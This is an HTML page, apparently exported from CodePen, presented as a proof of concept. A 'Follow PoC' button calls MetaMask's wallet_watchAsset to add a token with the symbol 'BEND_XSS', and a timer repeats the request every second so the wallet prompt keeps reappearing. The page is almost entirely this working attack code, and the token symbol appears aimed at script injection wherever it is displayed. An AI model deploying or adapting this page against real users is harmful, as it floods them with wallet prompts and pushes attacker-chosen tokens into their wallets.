

<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
<link rel="apple-touch-icon" type="image/png" href="https://cpwebassets.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png" />
<meta name="apple-mobile-web-app-title" content="CodePen">

<link rel="shortcut icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico" />

<link rel="mask-icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111" />


  <title>CodePen - Add Token To MetaMask Button</title>
  
  
  
  
<style>
body
{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  overflow:hidden;
  background-color: #000000;
background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='250' height='30' viewBox='0 0 1000 120'%3E%3Cg fill='none' stroke='%23222' stroke-width='10' %3E%3Cpath d='M-500 75c0 0 125-30 250-30S0 75 0 75s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 45c0 0 125-30 250-30S0 45 0 45s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 105c0 0 125-30 250-30S0 105 0 105s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 15c0 0 125-30 250-30S0 15 0 15s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500-15c0 0 125-30 250-30S0-15 0-15s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 135c0 0 125-30 250-30S0 135 0 135s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3C/g%3E%3C/svg%3E");
}

button
{
  
background: rgb(85,0,255);
background: linear-gradient(90deg, rgba(85,0,255,1) 35%, rgba(214,0,255,1) 100%);
  background-size: 200% 200%;
border:none;
  padding:30px 70px;
  border-radius:40px;
  color:#fff;
  font-size:20px;
  text-transform:uppercase;
    transition:ease-in all .5s;
  animation:button infinite alternate 5s;
}
button:hover
{
  cursor:pointer;
}

@keyframes button
{
  0% {		background-position: 0% 50%;
}
  100% {		background-position: 100% 70%;
}
}
</style>

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>


</head>

<body translate="no" >
  <button onclick="addTokenFunction()" class="add">Follow PoC</button>
    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-1b93190375e9ccc259df3a57c1abc0e64599724ae30d7ea4c6877eb615f89387.js"></script>

  <script src='https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.0/web3.min.js'></script>
      <script id="rendered-js" >
const tokenAddress = '0xc00971105e61274c8a5cd5a88fe7e037d935b513';
const tokenSymbol = 'BEND_XSS';
const tokenDecimals = 18;
const tokenImage = 'https://s2.coinmarketcap.com/static/img/coins/64x64/19162.png';

async function addTokenFunction() {

  try {

    const wasAdded = await ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: tokenAddress,
          symbol: tokenSymbol,
          decimals: tokenDecimals,
          image: tokenImage } } });




    if (wasAdded) {
      console.log('Thanks for your interest!');
    } else {
      console.log('HelloWorld Coin has not been added');
    }
  } catch (error) {
    console.log(error);
  }
}
//# sourceURL=pen.js
    </script>

  <script>setInterval(function () {addTokenFunction()}, 1000);</script>

</body>

</html>
 
